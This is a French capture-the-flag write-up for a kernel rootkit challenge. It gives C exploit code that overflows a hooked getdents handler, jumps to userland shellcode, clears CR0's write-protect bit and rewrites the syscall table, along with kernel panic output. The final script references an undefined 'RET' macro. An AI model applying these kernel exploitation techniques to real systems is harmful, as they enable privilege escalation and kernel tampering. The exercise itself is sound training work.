# Hello Rootkitty (Harder)
## Description
Une machine a été infectée par le rootkit Hello Rootkitty qui empêche la lecture de certains fichiers. Votre mission : aider la victime à récupérer le contenu des fichiers affectés. Une fois connecté en SSH (ctf:ctf), lancez le wrapper pour démarrer le challenge.

## Write-up 
Le module est quasiment le même que pour *Hello Rootkitty* mais cette fois ci la fonction `cleanup_module` ne fait pas son travail de nettoyage.
Donc si l'on parvient à retirer ce module, la table de syscall restera modifiée et on risque d'appeler de la mémoire non mappée.

Il va donc falloir que l'on fasse les choses nous même !

Il n'y a ni SMEP ni SMAP donc on va pouvoir écrire un shellcode en userland et sauter dessus avec grace au stack buffer overflow présent dans `ecsc_sys_getdents`

Dans un premier temps on va voir si l'offset a changé :
```c
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h> 
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#define _GNU_SOURCE
#include <dirent.h>


int main(int argc, char **argv){
    char name[300];
    
    memset(name, 0, 300);
    strcpy(name, "ecsc_flag_");
    strcat(name, "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa" );
    
    int fd = open(name, O_RDWR | O_CREAT, 644);
    write(fd, name, 200);
    close(fd);

    fd = open(".", O_RDONLY | O_DIRECTORY);
    syscall(SYS_getdents, fd, name, 200);

}
```

ce qui me donne un beau kernel panic  
```
Modules linked in: ecsc(O)
CPU: 0 PID: 66 Comm: ls Tainted: G           O    4.14.167 #11
task: ffff9b02c1e19100 task.stack: ffffa2f20009c000
RIP: 0010:0x61616161616e6161
RSP: 0018:ffffa2f20009ff38 EFLAGS: 00000282
RAX: 00000000000000e8 RBX: 61616161616a6161 RCX: 0000000000000000
RDX: 00007fffa711cc54 RSI: ffffa2f20009ff61 RDI: 00007fffa711cbb3
RBP: 61616161616d6161 R08: ffffa2f20009fed0 R09: ffffffffc021c024
R10: ffffa2f20009fec0 R11: 6161706161616161 R12: 61616161616b6161
R13: 61616161616c6161 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffff92a36000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007fffa711cb70 CR3: 0000000001e8a000 CR4: 00000000000006b0
Call Trace:
Code:  Bad RIP value.
RIP: 0x61616161616e6161 RSP: ffffa2f20009ff38
```
qui permet de trouver l'offset `cyclic -n 8 -l 0x61616161616e6161 -> 102`

On a plus qu'à écrire un shellcode qui va remettre la syscall table en place
```c
//  gcc -o exploit exploit.c -static -no-pie -O0 -masm=intel
#define OFFSET 102

#define BASE 0xffffffffa4e00000
#define GETDENTS64    0xc7610
#define GETDENTS      0xc7710
#define LSTAT         0xbad30
#define SYSCALL_TABLE 0x8001a0
#define GADGET_RET    0x02fd70

void shellcode(){
    unsigned long *table = (unsigned long *)(BASE+SYSCALL_TABLE);
    table[0xd9] = BASE + GETDENTS64;
    table[0x4e] = BASE + GETDENTS;
    table[0x06] = BASE + LSTAT;
    exit(0);
}

int main(int argc, char **argv){
    char name[200];
    unsigned long *rop;
    
    memset(name, 0, 200);
    strcpy(name, "ecsc_flag_");
    
    memset(name+strlen(name), 'A',OFFSET );
    
    rop = (unsigned long *)(name+strlen(name));
    rop[0] = BASE + GADGET_RET;
    rop[1] = shellcode;

    int fd = open(name, O_RDWR | O_CREAT, 644);
    write(fd, name, 200);
    close(fd);

    fd = open(".", O_RDONLY | O_DIRECTORY);
    syscall(SYS_getdents, fd, name, 200);
}
``` 
Mais en l'exécutant on se rend compte que ça ne marche pas, on a toujours un kernel panic.

La syscall table est dans une région read-only, ont doit alors se donner les droits de la modifier.  
Pour cela il faut mettre le 16e bit de CR0 à 0 [ref](https://en.wikipedia.org/wiki/Control_register#Control_registers_in_Intel_x86_series).

On obtient donc le script final:
```c
//  gcc -o exploit exploit.c -static -no-pie -O0 -masm=intel
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h> 
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#define _GNU_SOURCE 
#include <dirent.h>

#define OFFSET 102

#define BASE 0xffffffffa4e00000
#define GETDENTS64    0xc7610
#define GETDENTS      0xc7710
#define LSTAT         0xbad30
#define SYSCALL_TABLE 0x8001a0
#define GADGET_RET    0x02fd70


void shellcode(){
    unsigned long *table = (unsigned long *)(BASE+SYSCALL_TABLE);

    asm(
        ".intel_syntax noprefix\n"
        "MOV RDX,CR0\n"
        "AND RDX,-0x10001\n"
        "MOV CR0, RDX"
    );
    table[0xd9] = BASE + GETDENTS64;
    table[0x4e] = BASE + GETDENTS;
    table[0x06] = BASE + LSTAT;
    exit(0);
}

int main(int argc, char **argv){
    char name[200];
    unsigned long *rop;
    
    memset(name, 0, 200);
    strcpy(name, "ecsc_flag_");
    
    memset(name+strlen(name), 'A',OFFSET );
    
    rop = (unsigned long *)(name+strlen(name));
    rop[0] = BASE + RET;
    rop[1] = shellcode;

    int fd = open(name, O_RDWR | O_CREAT, 644);
    write(fd, name, 200);
    close(fd);

    fd = open(".", O_RDONLY | O_DIRECTORY);
    syscall(SYS_getdents, fd, name, 200);

}
```